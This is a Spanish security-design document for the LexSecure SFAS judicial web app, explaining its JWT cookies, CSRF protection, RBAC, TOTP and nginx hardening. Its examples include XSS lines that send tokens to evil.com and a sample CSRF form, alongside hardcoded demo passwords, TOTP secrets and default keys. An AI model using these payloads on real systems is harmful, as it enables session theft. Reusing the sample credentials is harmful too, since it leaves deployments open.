# LexSecure SFAS - Documentación de Seguridad
## Arquitectura de Seguridad Implementada v2.0

**Última actualización**: Enero 2026  
**Arquitectura**: JWT en Cookie HttpOnly + CSRF Double-Submit Pattern + 2FA TOTP

---

## Tabla de Contenidos

1. [Resumen Ejecutivo](#resumen-ejecutivo)
2. [Arquitectura de Autenticación](#arquitectura-de-autenticación)
3. [Protección CSRF](#protección-csrf)
4. [Control de Acceso (RBAC)](#control-de-acceso-rbac)
5. [Gestión de Contraseñas](#gestión-de-contraseñas)
6. [Auditoría y Privacidad](#auditoría-y-privacidad)
7. [Infraestructura de Seguridad](#infraestructura-de-seguridad)
8. [Análisis de Vulnerabilidades](#análisis-de-vulnerabilidades)
9. [Configuración de Producción](#configuración-de-producción)

---

## Resumen Ejecutivo

**LexSecure SFAS v2.0** implementa una arquitectura de seguridad multi-capa diseñada para resistir los ataques más comunes en aplicaciones web:

### ✅ Protecciones Implementadas

| Vulnerabilidad | Mitigación | Implementación |
|----------------|------------|----------------|
| **XSS (Cross-Site Scripting)** | Cookie HttpOnly + Sanitización HTML | JWT en `sfas_jwt` (HttpOnly=True) |
| **CSRF (Cross-Site Request Forgery)** | Double-Submit Cookie Pattern | Token CSRF vinculado al JWT |
| **Session Hijacking** | Token signing + Expiración + Revocación | HS256 JWT con exp=8h + blacklist |
| **Brute Force** | Rate Limiting + 2FA | Nginx: 5 req/min + TOTP obligatorio |
| **SQL Injection** | ORM SQLAlchemy + Prepared Statements | Sin concatenación de SQL |
| **Password Attacks** | bcrypt (factor 12) + Complejidad | Min 12 chars, uppercase, lowercase, números, símbolos |
| **Privilege Escalation** | RBAC estricto + Admin bypass seguro | `require_roles()` en cada endpoint |
| **Data Exposure** | Sanitización API pública + Pseudónimos | Sin datos sensibles en `/public/*` |
| **Timing Attacks** | `secrets.compare_digest()` | Comparación CSRF en tiempo constante |
| **Replay Attacks** | JTI único + Blacklist | Token ID único, revocación en logout |

### 🏆 Puntuación de Seguridad

- **OWASP Top 10 2021**: ✅ Completo
- **Defense in Depth**: ✅ 6 capas
- **Zero Trust**: ✅ Validación en cada request
- **Privacy by Design**: ✅ Pseudónimos HMAC en auditoría

---

## Arquitectura de Autenticación

### 🔐 ¿Por qué JWT en Cookie HttpOnly?

#### ❌ Problema con localStorage
```javascript
// VULNERABLE - No hacer esto
localStorage.setItem("token", jwt);

// XSS Attack:
<script>
  // Atacante inyecta este código
  fetch("https://evil.com/steal?token=" + localStorage.getItem("token"));
</script>
// ¡Token robado! 😱
```

#### ✅ Solución: Cookie HttpOnly
```python
# Backend setea cookie HttpOnly
response.set_cookie(
    key="sfas_jwt",
    value=jwt_token,
    httponly=True,  # JavaScript NO puede leerla
    secure=True,     # Solo HTTPS en producción
    samesite="lax"   # Protección CSRF adicional
)
```

```javascript
// Frontend NO puede acceder al JWT
console.log(document.cookie);
// Output: "sfas_csrf=abc123..."
// NO muestra sfas_jwt porque es HttpOnly ✅

// XSS Attack fallido:
<script>
  fetch("https://evil.com/steal?token=" + document.cookie);
  // Solo envía sfas_csrf (inútil sin el JWT) ✅
</script>
```

### 📋 Flujo de Autenticación Completo

```
┌──────────────────────────────────────────────────────────────┐
│                       PASO 1: LOGIN                          │
└──────────────────────────────────────────────────────────────┘

Cliente                          Backend
   │                                │
   ├──POST /auth/login─────────────>│
   │  {username, password}          │
   │                                ├─1. Buscar usuario en DB
   │                                ├─2. Verificar password (bcrypt)
   │                                ├─3. Generar login_token temporal (5 min)
   │<───{login_token}───────────────┤
   │                                │

┌──────────────────────────────────────────────────────────────┐
│                   PASO 2: VERIFY OTP                         │
└──────────────────────────────────────────────────────────────┘

Cliente                          Backend
   │                                │
   ├──POST /auth/verify-otp────────>│
   │  {login_token, totp_code}      │
   │                                ├─1. Decodificar login_token
   │                                ├─2. Verificar TOTP (PyOTP)
   │                                ├─3. Generar csrf_token único
   │                                ├─4. Crear JWT con csrf incluido
   │                                ├─5. Setear Cookie sfas_jwt (HttpOnly)
   │                                ├─6. Setear Cookie sfas_csrf (NO HttpOnly)
   │<───Set-Cookie: sfas_jwt=...────┤
   │<───Set-Cookie: sfas_csrf=...───┤
   │<───{username, role, user_id}───┤
   │                                │

┌──────────────────────────────────────────────────────────────┐
│              PASO 3: REQUESTS AUTENTICADOS                   │
└──────────────────────────────────────────────────────────────┘

Cliente                          Backend
   │                                │
   ├──GET /secretaria/casos────────>│
   │  Cookie: sfas_jwt=...          │  (automático)
   │  X-CSRF-Token: abc123...       │  (JS lee sfas_csrf)
   │                                ├─1. Leer JWT de Cookie
   │                                ├─2. Validar firma (HS256)
   │                                ├─3. Verificar exp (no expirado)
   │                                ├─4. Verificar blacklist
   │                                ├─5. Leer X-CSRF-Token header
   │                                ├─6. Validar jwt.csrf == header_csrf
   │                                ├─7. Validar rol
   │<───[{casos...}]────────────────┤
   │                                │

┌──────────────────────────────────────────────────────────────┐
│                      PASO 4: LOGOUT                          │
└──────────────────────────────────────────────────────────────┘

Cliente                          Backend
   │                                │
   ├──POST /auth/logout────────────>│
   │  Cookie: sfas_jwt=...          │
   │  X-CSRF-Token: abc123...       │
   │                                ├─1. Agregar JWT a blacklist
   │                                ├─2. Delete-Cookie sfas_jwt
   │                                ├─3. Delete-Cookie sfas_csrf
   │<───Set-Cookie: sfas_jwt=; Max-Age=0
   │<───{message: "Sesión cerrada"}─┤
   │                                │
```

### 🔑 Estructura del JWT

**Archivo**: `backend/app/core/jwt_handler.py`

```python
def create_jwt_token(user_id: int, username: str, role: str, csrf_token: str) -> str:
    payload = {
        # Información del usuario
        "user_id": 1,
        "username": "admin",
        "role": "admin",
        
        # Token CSRF vinculado (IMPORTANTE para CSRF protection)
        "csrf": "abc123def456...",
        
        # Tiempos (exp = Issued At + 8 horas)
        "exp": 1736890000,  # Expiración
        "iat": 1736861200,  # Issued At
        
        # Identificación única (para revocación)
        "jti": "uuid-unico-por-token",
        
        # Metadata
        "iss": "SFAS-LexSecure",  # Issuer
        "aud": "SFAS-Users"       # Audience
    }
    
    # Firma con HS256 (HMAC-SHA256)
    token = jwt.encode(payload, settings.jwt_secret_key, algorithm="HS256")
    return token
```

**Configuración**: `backend/app/core/settings.py`

```python
class Settings(BaseSettings):
    # JWT - Signature key (32+ caracteres en producción)
    jwt_secret_key: str = "supersecret-jwt-key-change-in-production-min-32-chars"
    jwt_algorithm: str = "HS256"  # HMAC-SHA256
    jwt_expire_hours: int = 8
    
    # Cookie JWT (HttpOnly - INMUNE a XSS)
    jwt_cookie_name: str = "sfas_jwt"
    jwt_cookie_httponly: bool = True   # ¡CRÍTICO!
    jwt_cookie_secure: bool = True     # Solo HTTPS en prod
    jwt_cookie_samesite: str = "lax"   # "strict" | "lax" | "none"
    
    # Cookie CSRF (NO HttpOnly - JS debe leerla)
    csrf_cookie_name: str = "sfas_csrf"
```

---

## Protección CSRF

### 🛡️ Double-Submit Cookie Pattern

#### ¿Qué es CSRF?

```
Atacante crea página maliciosa:

┌──────────────────────────────────────────────────────┐
│              https://evil.com/hack.html              │
├──────────────────────────────────────────────────────┤
│                                                      │
│  <form action="https://lexsecure.com/api/admin/delete-user" method="POST">
│    <input name="user_id" value="123">               │
│  </form>                                             │
│  <script>document.forms[0].submit()</script>        │
│                                                      │
│  Víctima visita evil.com → Request automático a     │
│  lexsecure.com CON sus cookies válidas              │
│  (el navegador las envía automáticamente)           │
│                                                      │
│  Sin protección CSRF: ¡Usuario borrado! 😱          │
└──────────────────────────────────────────────────────┘
```

#### ✅ Cómo lo prevenimos

```
┌──────────────────────────────────────────────────────────┐
│            Double-Submit Cookie Pattern                  │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  1. Backend genera token CSRF único                     │
│  2. Lo incluye en JWT payload: jwt.csrf = "abc123..."   │
│  3. Lo setea en cookie NO HttpOnly: sfas_csrf           │
│  4. Cliente lee cookie sfas_csrf (JS puede leerla)      │
│  5. Cliente envía en header: X-CSRF-Token: abc123...    │
│  6. Backend valida: jwt.csrf == header[X-CSRF-Token]    │
│                                                          │
│  ¿Por qué funciona?                                      │
│  • evil.com NO puede leer cookies de lexsecure.com      │
│    (Same-Origin Policy del navegador)                   │
│  • Sin el token correcto, request rechazado con 403     │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

### 🔧 Implementación

**Backend**: `backend/app/rbac/deps.py`

```python
def get_current_user(
    sfas_jwt: str | None = Cookie(default=None),
    x_csrf_token: str | None = Header(default=None, alias="X-CSRF-Token")
) -> dict:
    # 1. Validar JWT
    if not sfas_jwt:
        raise HTTPException(401, "No autenticado")
    
    payload = decode_jwt_token(sfas_jwt)
    
    # 2. Validar CSRF
    if not x_csrf_token:
        raise HTTPException(403, "Token CSRF requerido")
    
    # 3. Comparar tokens (timing-attack safe)
    if not validate_csrf(payload, x_csrf_token):
        raise HTTPException(403, "Token CSRF inválido - Posible ataque CSRF")
    
    return payload

def validate_csrf(jwt_payload: dict, csrf_header: str) -> bool:
    """
    Compara tokens con secrets.compare_digest()
    para protección contra timing attacks.
    """
    if not csrf_header:
        return False
    
    jwt_csrf = jwt_payload.get("csrf", "")
    
    # secrets.compare_digest() compara en tiempo constante
    # Evita que atacante infiera caracteres correctos midiendo tiempo
    return secrets.compare_digest(jwt_csrf, csrf_header)
```

**Frontend**: `frontend/src/ui/api.js`

```javascript
/**
 * Lee cookie sfas_csrf (NO HttpOnly, JS puede leerla)
 */
function getCsrfToken() {
  const m = document.cookie.match(/(^| )sfas_csrf=([^;]+)/);
  return m ? decodeURIComponent(m[2]) : null;
}

/**
 * Cliente API - Agrega CSRF automáticamente
 */
export async function apiFetch(url, options = {}, csrf = true) {
  const headers = {
    "Content-Type": "application/json",
    ...options.headers
  };
  
  // Agregar X-CSRF-Token si es necesario
  if (csrf) {
    const csrfToken = getCsrfToken();
    if (csrfToken) {
      headers["X-CSRF-Token"] = csrfToken;
    }
  }
  
  const response = await fetch(`${API_BASE}${url}`, {
    ...options,
    headers,
    credentials: "include"  // Envía cookies automáticamente
  });
  
  if (!response.ok) {
    if (response.status === 403) {
      // Posible ataque CSRF o token expirado
      throw new Error("Token CSRF inválido. Recarga la página.");
    }
    if (response.status === 401) {
      // Sesión expirada
      throw new Error("Sesión expirada. Inicia sesión nuevamente.");
    }
  }
  
  return response;
}

// Ejemplo de uso
export async function createCase(caseData) {
  const response = await apiFetch("/secretaria/casos", {
    method: "POST",
    body: JSON.stringify(caseData)
  }); // csrf=true por defecto
  
  return response.json();
}
```

---

## Control de Acceso (RBAC)

### 👥 Roles Definidos

| Rol | Permisos | Endpoints |
|-----|----------|-----------|
| **admin** | Acceso universal + gestión de aperturas | Todos los endpoints |
| **secretario** | Crear y gestionar casos | `/secretaria/*` |
| **juez** | Crear y firmar resoluciones | `/juez/*` |
| **custodio** | Aprobar aperturas M-de-N | `/aperturas/aprobar/*` |
| **auditor** | Consultar logs (pseudónimos) | `/audit/*` |

### 🔒 Implementación RBAC

**Archivo**: `backend/app/rbac/deps.py`

```python
def require_roles(*allowed_roles: str):
    """
    Dependency factory para validar roles.
    
    Usage:
        @router.get("/casos")
        def get_cases(user: dict = Depends(require_roles("secretario", "admin"))):
            # Solo secretarios y admins pueden acceder
            ...
    """
    def dependency(user: dict = Depends(get_current_user)) -> dict:
        # Admin bypass: admin tiene acceso universal
        if user["role"] == "admin":
            return user
        
        # Validar rol
        if user["role"] not in allowed_roles:
            raise HTTPException(
                403,
                f"Acceso denegado. Requiere rol: {', '.join(allowed_roles)}"
            )
        
        return user
    
    return dependency

def require_auth():
    """Dependency para cualquier usuario autenticado"""
    return Depends(get_current_user)
```

**Ejemplos de uso**:

```python
# cases/router.py - Solo secretarios y admins
@router.get("/casos")
def get_cases(user: dict = Depends(require_roles("secretario", "admin"))):
    db = SessionSecretaria()
    cases = db.query(models.Case).all()
    return cases

# judge/router.py - Solo jueces y admins
@router.post("/resoluciones")
def create_resolution(
    data: ResolutionCreate,
    user: dict = Depends(require_roles("juez", "admin"))
):
    # Solo jueces pueden crear resoluciones
    ...

# audit/router.py - Solo auditores y admins
@router.get("/logs")
def get_logs(user: dict = Depends(require_roles("auditor", "admin"))):
    # Solo auditores pueden ver logs
    ...

# opening/router.py - Solo custodios
@router.post("/aprobar/{opening_id}")
def approve_opening(
    opening_id: int,
    user: dict = Depends(require_roles("custodio"))
):
    # Admin NO puede aprobar (requiere M custodios diferentes)
    if user["role"] == "admin":
        raise HTTPException(403, "Admin no puede aprobar aperturas")
    ...
```

---

## Gestión de Contraseñas

### 🔐 Hashing con bcrypt

**Configuración**: Factor 12 (2^12 = 4096 rondas)

```python
import bcrypt

# Crear usuario (seed)
def create_user(username: str, password: str, role: str):
    # bcrypt.gensalt(12) → 2^12 = 4096 rondas
    hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(12))
    
    user = models.User(
        username=username,
        hashed_password=hashed.decode(),  # Almacenar como string
        role=role,
        totp_secret=pyotp.random_base32()  # Generar secret TOTP
    )
    db.add(user)
    db.commit()

# Verificar contraseña (login)
def verify_password(plain_password: str, hashed_password: str) -> bool:
    return bcrypt.checkpw(
        plain_password.encode(),
        hashed_password.encode()
    )
```

### 📏 Política de Contraseñas

**Requisitos**:
- ✅ Mínimo 12 caracteres
- ✅ Al menos 1 mayúscula
- ✅ Al menos 1 minúscula
- ✅ Al menos 1 número
- ✅ Al menos 1 símbolo especial (!@#$%^&*)

**Ejemplo**: `Admin!2026_SFAS`

### 🔢 2FA con TOTP

**Configuración**: PyOTP + Google Authenticator

```python
import pyotp

# Generar secret para nuevo usuario
totp_secret = pyotp.random_base32()  # "JBSWY3DPEHPK3PXP"

# Guardar en DB
user.totp_secret = totp_secret

# Verificar código (login)
totp = pyotp.TOTP(user.totp_secret)
is_valid = totp.verify(user_input_code, valid_window=1)
# valid_window=1 acepta código actual ± 30 segundos (tolerancia)
```

**Usuarios demo con secrets**:

```python
{
    "admin": {
        "password": "Admin!2026_SFAS",
        "totp_secret": "IMPZMWM2LZRT7634WHP3II3NTYCKYQAA"
    },
    "juez1": {
        "password": "Juez!2026_SFAS",
        "totp_secret": "4UW6B7UPSVOUR33QQKSXOGWKOPW4JPF6"
    },
    "secret1": {
        "password": "Secret!2026_SFAS",
        "totp_secret": "RTBNNG2ILXO3NCSRXV45JMKE6QQTNGB7"
    }
}
```

---

## Auditoría y Privacidad

### 📊 Sistema de Auditoría

**Todos los eventos se registran**:

```python
# audit/logger.py
def log_event(event_type: str, **details):
    """
    Registra evento en base de datos de auditoría con:
    - Pseudónimos HMAC para user_id/username
    - Timestamp preciso
    - IP y User-Agent redactados
    - Detalles sanitizados
    """
    db = SessionAuditoria()
    
    # Generar pseudónimos HMAC
    user_id_pseudo = None
    username_pseudo = None
    
    if "user_id" in details:
        user_id_pseudo = generate_pseudonym(str(details["user_id"]))
    
    if "username" in details:
        username_pseudo = generate_pseudonym(details["username"])
    
    event = models.AuditEvent(
        event_type=event_type,
        user_id_pseudonym=user_id_pseudo,
        username_pseudonym=username_pseudo,
        timestamp=datetime.utcnow(),
        details=sanitize_sensitive_data(details)
    )
    
    db.add(event)
    db.commit()

def generate_pseudonym(value: str) -> str:
    """
    Genera pseudónimo HMAC-SHA256.
    
    Mismo valor → Mismo pseudónimo (rastreable)
    Valor diferente → Pseudónimo diferente
    Irreversible sin conocer la clave
    """
    key = settings.audit_pseudonym_key.encode()
    return hmac.new(key, value.encode(), hashlib.sha256).hexdigest()[:16]

def sanitize_sensitive_data(details: dict) -> dict:
    """
    Redacta información sensible:
    - Passwords → "[REDACTED]"
    - Tokens → "[REDACTED]"
    - TOTP codes → "[REDACTED]"
    - IP addresses → primeros 2 octetos (192.168.x.x)
    """
    sensitive_keys = ["password", "token", "totp_code", "jwt"]
    
    sanitized = {}
    for key, value in details.items():
        if key in sensitive_keys:
            sanitized[key] = "[REDACTED]"
        elif key == "ip_address":
            sanitized[key] = anonymize_ip(value)
        else:
            sanitized[key] = value
    
    return sanitized
```

**Eventos registrados**:

```python
# Login
log_event("login_attempt", user_id=1, username="admin")
log_event("login_success", user_id=1, username="admin", role="admin")
log_event("otp_failed", user_id=1, username="admin")

# Casos
log_event("case_created", user_id=2, username="secret1", case_id=123)
log_event("case_assigned", user_id=2, case_id=123, assigned_to="juez1")

# Resoluciones
log_event("resolution_created", user_id=3, username="juez1", case_id=123)
log_event("resolution_signed", user_id=3, case_id=123, resolution_id=456, hash="abc123...")

# Aperturas
log_event("opening_created", user_id=1, opening_id=789, required_approvals=3)
log_event("opening_approved", user_id=4, username="cust1", opening_id=789)

# Logout
log_event("logout", user_id=1, username="admin")
```

### 🎭 Consulta de Logs (Auditores)

```python
# audit/router.py
@router.get("/logs")
def get_audit_logs(
    user: dict = Depends(require_roles("auditor", "admin")),
    event_type: str | None = None,
    start_date: datetime | None = None,
    end_date: datetime | None = None
):
    """
    Retorna logs con pseudónimos.
    Auditor NO ve user_id ni username reales.
    Solo ve pseudónimos consistentes.
    """
    db = SessionAuditoria()
    
    query = db.query(models.AuditEvent)
    
    if event_type:
        query = query.filter(models.AuditEvent.event_type == event_type)
    
    if start_date:
        query = query.filter(models.AuditEvent.timestamp >= start_date)
    
    if end_date:
        query = query.filter(models.AuditEvent.timestamp <= end_date)
    
    events = query.order_by(models.AuditEvent.timestamp.desc()).limit(1000).all()
    
    return [
        {
            "event_type": e.event_type,
            "user_pseudonym": e.user_id_pseudonym,  # "a3f2c1..." (consistente)
            "username_pseudonym": e.username_pseudonym,  # "b7d9e4..."
            "timestamp": e.timestamp.isoformat(),
            "details": e.details
        }
        for e in events
    ]
```

---

## Infraestructura de Seguridad

### 🌐 Nginx - Reverse Proxy

**Archivo**: `nginx/default.conf`

```nginx
# Rate Limiting Zones
limit_req_zone $binary_remote_addr zone=public_limit:10m rate=10r/s;
limit_req_zone $binary_remote_addr zone=auth_limit:10m rate=5r/m;

server {
    listen 80;
    server_name localhost;
    
    # Security Headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    
    # Frontend
    location / {
        proxy_pass http://frontend:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
    
    # Backend API
    location /api/ {
        # Rate limiting
        limit_req zone=public_limit burst=20 nodelay;
        
        # API pública sin rate limiting estricto
        proxy_pass http://backend:8000/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
    
    # Autenticación - Rate limiting estricto
    location /api/auth/ {
        limit_req zone=auth_limit burst=5 nodelay;
        
        proxy_pass http://backend:8000/auth/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

**Configuraciones clave**:

1. **Rate Limiting**:
   - API pública: 10 req/segundo
   - Autenticación: 5 req/minuto (anti brute-force)

2. **Security Headers**:
   - `X-Frame-Options`: Previene clickjacking
   - `X-Content-Type-Options`: Previene MIME sniffing
   - `CSP`: Política de seguridad de contenido
   - `HSTS`: Force HTTPS en producción

### 🐳 Docker Compose

**Arquitectura**: 7 contenedores

```yaml
services:
  # Base de datos independientes
  postgres_identidad:
    image: postgres:16-alpine
    environment:
      POSTGRES_DB: identidad
      POSTGRES_USER: user
      POSTGRES_PASSWORD: pass
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U user"]
      interval: 5s
      timeout: 5s
      retries: 5
  
  postgres_secretaria:
    image: postgres:16-alpine
    environment:
      POSTGRES_DB: secretaria
      POSTGRES_USER: user
      POSTGRES_PASSWORD: pass
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U user"]
  
  postgres_jueces:
    image: postgres:16-alpine
    environment:
      POSTGRES_DB: jueces
      POSTGRES_USER: user
      POSTGRES_PASSWORD: pass
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U user"]
  
  postgres_auditoria:
    image: postgres:16-alpine
    environment:
      POSTGRES_DB: auditoria
      POSTGRES_USER: user
      POSTGRES_PASSWORD: pass
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U user"]
  
  # Backend FastAPI
  backend:
    build: ./backend
    depends_on:
      postgres_identidad:
        condition: service_healthy
      postgres_secretaria:
        condition: service_healthy
      postgres_jueces:
        condition: service_healthy
      postgres_auditoria:
        condition: service_healthy
    environment:
      POSTGRES_IDENTIDAD_URL: postgresql://user:pass@postgres_identidad:5432/identidad
      POSTGRES_SECRETARIA_URL: postgresql://user:pass@postgres_secretaria:5432/secretaria
      POSTGRES_JUECES_URL: postgresql://user:pass@postgres_jueces:5432/jueces
      POSTGRES_AUDITORIA_URL: postgresql://user:pass@postgres_auditoria:5432/auditoria
  
  # Frontend React + Vite
  frontend:
    build: ./frontend
    depends_on:
      - backend
  
  # Reverse Proxy
  nginx:
    image: nginx:1.27-alpine
    ports:
      - "80:80"
    depends_on:
      - frontend
      - backend
    volumes:
      - ./nginx/default.conf:/etc/nginx/conf.d/default.conf:ro
```

---

## Análisis de Vulnerabilidades

### ✅ OWASP Top 10 2021 - Mitigaciones

#### A01:2021 - Broken Access Control
- ✅ **Mitigación**: RBAC estricto con `require_roles()`
- ✅ JWT validado en cada request
- ✅ Admin bypass controlado
- ✅ Endpoints públicos explícitos (sin auth)

#### A02:2021 - Cryptographic Failures
- ✅ **Mitigación**: 
  - JWT firmado con HS256 (HMAC-SHA256)
  - Passwords con bcrypt (factor 12)
  - TOTP secrets random_base32 (160 bits)
  - HTTPS en producción (cookie Secure=True)

#### A03:2021 - Injection
- ✅ **Mitigación**:
  - SQLAlchemy ORM (prepared statements)
  - Sin concatenación de SQL
  - Sanitización HTML en inputs/outputs

#### A04:2021 - Insecure Design
- ✅ **Mitigación**:
  - Defense in Depth (6 capas)
  - Zero Trust (validación en cada request)
  - Privacy by Design (pseudónimos)
  - Secure by Default (HttpOnly, CSRF)

#### A05:2021 - Security Misconfiguration
- ✅ **Mitigación**:
  - Security headers (CSP, HSTS, X-Frame-Options)
  - Rate limiting configurado
  - Secrets en variables de entorno
  - Debug=False en producción

#### A06:2021 - Vulnerable Components
- ✅ **Mitigación**:
  - Dependencias actualizadas (requirements.txt)
  - Python 3.12, FastAPI latest, React 18
  - Docker alpine images (minimal attack surface)

#### A07:2021 - Identification and Authentication Failures
- ✅ **Mitigación**:
  - 2FA obligatorio (TOTP)
  - bcrypt para passwords
  - Rate limiting en /auth/* (5 req/min)
  - Session expiration (8 horas)
  - Token revocation (blacklist)

#### A08:2021 - Software and Data Integrity Failures
- ✅ **Mitigación**:
  - JWT signature verification
  - CSRF validation
  - Audit logging de todos los cambios

#### A09:2021 - Security Logging and Monitoring Failures
- ✅ **Mitigación**:
  - Auditoría completa con `log_event()`
  - Timestamps precisos
  - Pseudónimos para privacidad
  - Dashboard de auditoría

#### A10:2021 - Server-Side Request Forgery (SSRF)
- ✅ **Mitigación**:
  - Sin requests a URLs externas desde backend
  - API pública sanitizada
  - No user-controlled URLs

---

## Configuración de Producción

### 🚀 Checklist Pre-Producción

#### 1. Secrets y Claves

```python
# backend/app/core/settings.py

# ❌ DESARROLLO
jwt_secret_key = "supersecret-jwt-key-change-in-production-min-32-chars"
audit_pseudonym_key = "secret-key-for-hmac-pseudonymization-change-in-prod"

# ✅ PRODUCCIÓN
jwt_secret_key = os.getenv("JWT_SECRET_KEY")  # 32+ caracteres random
audit_pseudonym_key = os.getenv("AUDIT_PSEUDONYM_KEY")  # 32+ caracteres random

# Generar claves seguras:
# python -c "import secrets; print(secrets.token_urlsafe(32))"
```

#### 2. Cookies Seguras

```python
# ✅ PRODUCCIÓN
jwt_cookie_secure = True  # Solo HTTPS
jwt_cookie_samesite = "strict"  # Más restrictivo
```

#### 3. CORS

```python
# main.py

# ❌ DESARROLLO
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Permitir cualquier origen
    allow_credentials=True,
)

# ✅ PRODUCCIÓN
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://lexsecure.com"],  # Solo tu dominio
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Content-Type", "X-CSRF-Token"],
)
```

#### 4. Rate Limiting

```nginx
# nginx/default.conf

# ✅ PRODUCCIÓN - Más restrictivo
limit_req_zone $binary_remote_addr zone=auth_limit:10m rate=3r/m;  # 3 req/min
limit_req_zone $binary_remote_addr zone=api_limit:10m rate=5r/s;   # 5 req/s
```

#### 5. HTTPS (Nginx)

```nginx
server {
    listen 443 ssl http2;
    server_name lexsecure.com;
    
    ssl_certificate /etc/nginx/ssl/cert.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;
    
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;
    
    # HSTS
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    
    # ... resto de configuración
}

# Redirect HTTP → HTTPS
server {
    listen 80;
    server_name lexsecure.com;
    return 301 https://$server_name$request_uri;
}
```

#### 6. Base de Datos

```yaml
# docker-compose.prod.yml

services:
  postgres_identidad:
    environment:
      POSTGRES_PASSWORD: ${DB_PASSWORD_IDENTIDAD}  # Desde .env
    volumes:
      - postgres_identidad_data:/var/lib/postgresql/data  # Persistencia
    restart: always

volumes:
  postgres_identidad_data:
  postgres_secretaria_data:
  postgres_jueces_data:
  postgres_auditoria_data:
```

#### 7. Logging

```python
# main.py

import logging

# ✅ PRODUCCIÓN
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/var/log/sfas/app.log'),
        logging.StreamHandler()
    ]
)

# NO loguear información sensible
logger.info(f"User {user['username']} logged in")  # ✅ OK
logger.info(f"JWT token: {token}")  # ❌ NUNCA
```

#### 8. Monitoreo

```bash
# Healthcheck endpoint
GET /api/health
→ {"status": "ok", "timestamp": "2026-01-14T10:30:00Z"}

# Métricas para Prometheus/Grafana
- Request count por endpoint
- Response times
- Error rates
- Login attempts (success/failed)
- Active sessions
```

### 🔒 Hardening Adicional

1. **Fail2ban**: Banear IPs con intentos de login fallidos
2. **WAF**: Web Application Firewall (Cloudflare, AWS WAF)
3. **DDoS Protection**: Cloudflare, AWS Shield
4. **Backups**: Automáticos diarios de PostgreSQL
5. **Secrets Management**: AWS Secrets Manager, HashiCorp Vault
6. **Container Security**: Snyk, Trivy para escanear vulnerabilidades

---

## Resumen de Implementación

### 📁 Archivos Clave

| Archivo | Responsabilidad | Líneas Clave |
|---------|----------------|--------------|
| `backend/app/core/settings.py` | Configuración JWT + Cookies | `jwt_secret_key`, `jwt_cookie_httponly=True` |
| `backend/app/core/jwt_handler.py` | Crear/validar JWT + CSRF | `create_jwt_token()`, `validate_csrf()` |
| `backend/app/auth/router.py` | Login, OTP, logout | `set_auth_cookies()`, `clear_auth_cookies()` |
| `backend/app/rbac/deps.py` | RBAC + Validación CSRF | `get_current_user()`, `require_roles()` |
| `backend/app/audit/logger.py` | Auditoría con pseudónimos | `log_event()`, `generate_pseudonym()` |
| `frontend/src/ui/api.js` | Cliente API con CSRF | `getCsrfToken()`, `credentials: "include"` |
| `nginx/default.conf` | Rate limiting + Headers | `limit_req_zone`, `add_header` |

### 🎯 Flujo Completo

```
1. Usuario ingresa username + password
2. Backend valida con bcrypt
3. Backend retorna login_token temporal (5 min)
4. Usuario ingresa código TOTP (6 dígitos)
5. Backend verifica TOTP con PyOTP
6. Backend genera csrf_token único
7. Backend crea JWT con csrf incluido (firma HS256)
8. Backend setea Cookie sfas_jwt (HttpOnly) + sfas_csrf
9. Frontend recibe cookies automáticamente
10. Requests: Cookie automática + Header X-CSRF-Token
11. Backend valida: JWT signature + exp + blacklist + CSRF
12. Backend valida rol con require_roles()
13. Backend procesa request y registra evento
14. Logout: Agregar JWT a blacklist + borrar cookies
```

### 🛡️ Capas de Seguridad

1. **Nginx**: Rate limiting + Security headers
2. **Cookies HttpOnly**: Protección XSS
3. **CSRF Tokens**: Protección CSRF
4. **JWT Signature**: Integridad del token
5. **RBAC**: Control de acceso por rol
6. **Auditoría**: Rastreabilidad completa

---

## Conclusión

**LexSecure SFAS v2.0** implementa una arquitectura de seguridad robusta y moderna que protege contra las amenazas más comunes en aplicaciones web. La combinación de JWT en Cookie HttpOnly, CSRF Double-Submit Pattern, 2FA TOTP y RBAC estricto proporciona múltiples capas de defensa.

**Puntos clave**:
- ✅ Inmune a XSS (JWT en HttpOnly)
- ✅ Protegido contra CSRF (Double-Submit)
- ✅ Resistente a brute force (Rate limiting + 2FA)
- ✅ Rastreabilidad completa (Auditoría)
- ✅ Privacidad garantizada (Pseudónimos HMAC)

**Recomendaciones para producción**:
1. Cambiar todos los secrets a valores aleatorios de 32+ caracteres
2. Habilitar HTTPS con certificado válido
3. Configurar CORS restrictivo
4. Implementar monitoring y alertas
5. Backups automáticos de base de datos
6. Escaneo de vulnerabilidades regular

---

*Documentación generada para LexSecure SFAS v2.0 - Enero 2026*
